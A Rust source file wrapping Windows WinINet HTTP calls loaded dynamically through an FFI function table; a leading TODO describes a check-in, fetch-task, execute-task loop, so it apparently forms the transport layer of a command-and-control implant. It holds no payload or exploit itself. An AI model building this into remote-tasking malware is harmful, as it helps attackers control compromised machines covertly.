// TODO: Initial state -> generate public key -> checkin -> regenerate public key if failed, otherwise continue -> fetch task -> execute task

pub mod error;

use crate::ffi::{FfiType, FnTable, GetLastError};
use libffi::middle::arg;
use std::ffi::CString;
use std::os::raw::c_void;
use std::ptr;
use std::{cell::RefCell, ffi::CStr, rc::Rc};

pub struct InternetHandle {
    fn_table: Rc<RefCell<FnTable>>,
    handle: *mut c_void,
}

pub struct HttpRequestHandle<'req> {
    fn_table: Rc<RefCell<FnTable>>,
    connection_handle: *mut c_void,
    request_handle: *mut c_void,
    // TODO is this neccessary? I believe we want to close the handle to this before InternetHandle's
    _internet_handle: &'req InternetHandle,
}

pub struct HttpResponseHandle<'resp> {
    fn_table: Rc<RefCell<FnTable>>,
    handle: HttpRequestHandle<'resp>,
}

bitflags! {
    pub struct InternetUrlFlags: u32 {
        const INTERNET_FLAG_HYPERLINK = 0x400;
        const INTERNET_FLAG_IGNORE_CERT_CN_INVALID = 0x1000;
        const INTERNET_FLAG_IGNORE_CERT_DATE_INVALID = 0x2000;
        const INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP = 0x8000;
        const INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS = 0x4000;
        const INTERNET_FLAG_KEEP_CONNECTION = 0x400000;
        const INTERNET_FLAG_NEED_FILE = 0x10;
        const INTERNET_FLAG_NO_AUTH = 0x40000;
        const INTERNET_FLAG_NO_AUTO_REDIRECT = 0x200000;
        const INTERNET_FLAG_NO_CACHE_WRITE = 0x4000000;
        const INTERNET_FLAG_NO_COOKIES = 0x80000;
        const INTERNET_FLAG_NO_UI = 0x200;
        const INTERNET_FLAG_PRAGMA_NOCACHE = 0x100;
        const INTERNET_FLAG_RELOAD = 0x80000000;
        const INTERNET_FLAG_RESYNCHRONIZE = 0x800;
        const INTERNET_FLAG_SECURE = 0x800000;
    }
}

impl InternetHandle {
    // TODO possibly allow to set proxy setting/configure to only use direct connection
    pub fn create(fn_table: Rc<RefCell<FnTable>>, ua_string: &CStr) -> error::Result<Self> {
        let handle: *mut c_void;

        let fn_table_guard = fn_table.borrow();

        unsafe {
            handle = fn_table_guard.call_fn::<*mut c_void>(
                "InternetOpenA".to_string(),
                &[
                    arg(&ua_string.as_ptr()),
                    arg(&0u32), //INTERNET_OPEN_TYPE_PRECONFIG
                    arg(&ptr::null::<c_void>()),
                    arg(&ptr::null::<c_void>()),
                    arg(&0u32), //No flags, synchronous request
                ],
            )?;

            if handle.is_null() {
                return Err(error::Error::WinApiError(GetLastError()));
            }
        }

        Ok(InternetHandle {
            fn_table: fn_table.clone(),
            handle,
        })
    }

    pub fn create_request(
        &self,
        host: &CStr,
        port: u16,
        verb: &CStr,
        path: &CStr,
        flags: InternetUrlFlags,
    ) -> error::Result<HttpRequestHandle> {
        let connection_handle: *mut c_void;
        let request_handle: *mut c_void;

        let fn_table = self.fn_table.borrow();

        unsafe {
            connection_handle = fn_table.call_fn(
                "InternetConnectA".to_string(),
                &[
                    arg(&self.handle),
                    arg(&host.as_ptr()),
                    arg(&port),
                    arg(&ptr::null::<c_void>()),
                    arg(&ptr::null::<c_void>()),
                    arg(&3u32), // define INTERNET_SERVICE_HTTP 3
                    // TODO do we want to support async requests? In that case, the following flag must be used
                    arg(&0u32),
                    arg(&ptr::null::<c_void>()),
                ],
            )?;

            if connection_handle.is_null() {
                return Err(error::Error::WinApiError(GetLastError()));
            }

            request_handle = fn_table.call_fn(
                "HttpOpenRequestA".to_string(),
                &[
                    arg(&connection_handle),
                    arg(&verb.as_ptr()),
                    arg(&path.as_ptr()),
                    arg(&ptr::null::<c_void>()),
                    arg(&ptr::null::<c_void>()),
                    arg(&ptr::null::<c_void>()),
                    arg(&flags.bits()),
                    arg(&ptr::null::<c_void>()),
                ],
            )?;

            if request_handle.is_null() {
                return Err(error::Error::WinApiError(GetLastError()));
            }
        }

        Ok(HttpRequestHandle {
            fn_table: self.fn_table.clone(),
            connection_handle,
            request_handle,
            _internet_handle: self,
        })
    }
}

impl<'req> HttpRequestHandle<'req> {
    pub fn set_headers(&mut self, headers: &[CString]) -> error::Result<()> {
        let fn_table = self.fn_table.borrow();

        for header in headers {
            unsafe {
                let result: i32 = fn_table.call_fn(
                    "HttpAddRequestHeadersA".to_string(),
                    &[
                        arg(&self.request_handle),
                        arg(&header.as_ptr()),
                        arg(&-1i32),
                        arg(&((0x20000000u32 | 0x80000000u32) as u32)), // HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE
                    ],
                )?;

                if result == 0 {
                    return Err(error::Error::WinApiError(GetLastError()));
                }
            }
        }

        Ok(())
    }

    pub fn send_request(self, data: Option<&[u8]>) -> error::Result<HttpResponseHandle<'req>> {
        let mut data_len: u32 = 0;
        let data_ptr = match data {
            Some(data) => {
                data_len = data.len() as u32;
                data.as_ptr() as *const c_void
            }
            None => ptr::null::<c_void>(),
        };

        unsafe {
            let result: i32 = self.fn_table.borrow().call_fn(
                "HttpSendRequestA".to_string(),
                &[
                    arg(&self.request_handle),
                    arg(&ptr::null::<c_void>()),
                    arg(&-1i32),
                    arg(&data_ptr),
                    arg(&data_len),
                ],
            )?;

            if result == 0 {
                return Err(error::Error::WinApiError(GetLastError()));
            }
        }

        Ok(HttpResponseHandle {
            fn_table: self.fn_table.clone(),
            handle: self,
        })
    }
}

impl<'resp> HttpResponseHandle<'resp> {
    // TODO allow passing dwInfoLevel flags to HttpQueryInfoA get specific information
    pub fn get_response_headers(&self) -> error::Result<Vec<u8>> {
        let chunk_size = 0xffff;
        let mut out: Vec<u8> = Vec::with_capacity(chunk_size);
        // Note that HttpQueryInfoA writes bytes written to capacity.
        let mut capacity: u32 = out.capacity() as u32;
        let mut lpdwindex: u32 = 0;
        let mut is_successful: i32 = 0;

        let fn_table = self.fn_table.borrow();

        // Now this looks quite ugly, is_successful is perhaps a bad variable name as it is used here (as a i32).
        // Also, the structure is possibly not best for readability, but I could not think of a more pretty way to do it when I wrote this function.
        unsafe {
            while is_successful == 0 {
                is_successful = fn_table.call_fn(
                    "HttpQueryInfoA".to_string(),
                    &[
                        arg(&self.handle.request_handle),
                        arg(&22u32), // HTTP_QUERY_RAW_HEADERS_CRLF
                        arg(&out.as_mut_ptr()),
                        arg(&(&mut capacity as *mut _ as *mut c_void)),
                        arg(&(&mut lpdwindex as *mut _ as *mut c_void)),
                    ],
                )?;

                if is_successful == 0 {
                    let error_code = GetLastError();
                    if error_code != 122 {
                        // 122 = ERROR_INSUFFICIENT_BUFFER
                        return Err(error::Error::WinApiError(GetLastError()));
                    }

                    out.reserve(out.capacity() + chunk_size);
                    capacity = out.capacity() as u32;
                    lpdwindex = 0;
                }
            }

            // Remember that HttpQueryInfoA writes bytes written to capacity.
            out.set_len(capacity as usize);
        }

        out.shrink_to_fit();
        Ok(out)
    }

    // After the response has been read, it is not possible to read it again, so this function takes ownership of the struct.
    // The result could be "cached", but I won't do it unless it is required.
    pub fn get_response(self) -> error::Result<Vec<u8>> {
        let chunk_size = 0xffff;
        let mut out: Vec<u8> = Vec::with_capacity(chunk_size);
        let mut total_bytes_written: u32 = 0;
        let mut bytes_written: u32 = 0;

        let fn_table = self.fn_table.borrow();

        unsafe {
            //is_successful is a boolean, 0 = false
            let mut is_successful: i32 = fn_table.call_fn(
                "InternetReadFile".to_string(),
                &[
                    arg(&self.handle.request_handle),
                    arg(&out.as_mut_ptr()),
                    arg(&(out.capacity() as u32 - total_bytes_written)),
                    arg(&(&mut bytes_written as *mut u32)),
                ],
            )?;

            while is_successful != 0 && bytes_written != 0 {
                total_bytes_written += bytes_written;
                bytes_written = 0;

                out.set_len(total_bytes_written as usize);
                out.reserve(chunk_size);

                // TODO use spare_capacity_mut when stable https://doc.rust-lang.org/std/vec/struct.Vec.html#method.spare_capacity_mut
                is_successful = fn_table.call_fn(
                    "InternetReadFile".to_string(),
                    &[
                        arg(&self.handle.request_handle),
                        arg(&out.as_mut_ptr().add(total_bytes_written as usize)),
                        arg(&(out.capacity() as u32 - total_bytes_written)),
                        arg(&(&mut bytes_written as *mut u32)),
                    ],
                )?;
            }

            // TODO Documentation mentions ERROR_INSUFFICIENT_BUFFER, but I have been unable to encounter that so far. Does it need to be handled?
            if is_successful == 0 {
                return Err(error::Error::WinApiError(GetLastError()));
            }
        }

        out.shrink_to_fit();
        Ok(out)
    }
}

impl Drop for InternetHandle {
    fn drop(&mut self) {
        unsafe {
            let _ = self
                .fn_table
                .borrow()
                .call_fn::<u32>("InternetCloseHandle".to_string(), &[arg(&self.handle)]);
        }
    }
}

impl<'req> Drop for HttpRequestHandle<'req> {
    fn drop(&mut self) {
        unsafe {
            let fn_table = self.fn_table.borrow();
            let _ = fn_table.call_fn::<u32>(
                "InternetCloseHandle".to_string(),
                &[arg(&self.request_handle)],
            );
            let _ = fn_table.call_fn::<u32>(
                "InternetCloseHandle".to_string(),
                &[arg(&self.connection_handle)],
            );
        }
    }
}

pub fn register_wininet_fns(fn_table: Rc<RefCell<FnTable>>) -> error::Result<()> {
    let mut fn_table = fn_table.borrow_mut();

    fn_table.register_fn(
        "InternetOpenA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::POINTER as i32,
        &[
            FfiType::LPCSTR as i32,
            FfiType::DWORD as i32,
            FfiType::LPCSTR as i32,
            FfiType::LPCSTR as i32,
            FfiType::DWORD as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetConnectA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::POINTER as i32,
        &[
            FfiType::POINTER as i32,
            FfiType::LPCSTR as i32,
            FfiType::INTERNET_PORT as i32,
            FfiType::LPCSTR as i32,
            FfiType::LPCSTR as i32,
            FfiType::DWORD as i32,
            FfiType::DWORD as i32,
            FfiType::POINTER as i32,
        ],
    )?;

    fn_table.register_fn(
        "HttpOpenRequestA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::POINTER as i32,
        &[
            FfiType::POINTER as i32,
            FfiType::LPCSTR as i32,
            FfiType::LPCSTR as i32,
            FfiType::LPCSTR as i32,
            FfiType::LPCSTR as i32,
            FfiType::LPCSTR as i32,
            FfiType::DWORD as i32,
            FfiType::POINTER as i32,
        ],
    )?;

    fn_table.register_fn(
        "HttpAddRequestHeadersA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::SINT32 as i32,
        &[
            FfiType::POINTER as i32,
            FfiType::LPCSTR as i32,
            FfiType::DWORD as i32,
            FfiType::DWORD as i32,
        ],
    )?;

    fn_table.register_fn(
        "HttpSendRequestA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::SINT32 as i32,
        &[
            FfiType::POINTER as i32,
            FfiType::LPCSTR as i32,
            FfiType::DWORD as i32,
            FfiType::LPVOID as i32,
            FfiType::DWORD as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetReadFile".to_string(),
        "Wininet.dll".to_string(),
        FfiType::UINT32 as i32,
        &[
            FfiType::POINTER as i32,
            FfiType::POINTER as i32,
            FfiType::DWORD as i32,
            FfiType::POINTER as i32,
        ],
    )?;

    fn_table.register_fn(
        "HttpQueryInfoA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::UINT32 as i32,
        &[
            FfiType::POINTER as i32,
            FfiType::UINT32 as i32,
            FfiType::POINTER as i32,
            FfiType::POINTER as i32,
            FfiType::POINTER as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetCloseHandle".to_string(),
        "Wininet.dll".to_string(),
        FfiType::UINT32 as i32,
        &[FfiType::POINTER as i32],
    )?;

    Ok(())
}
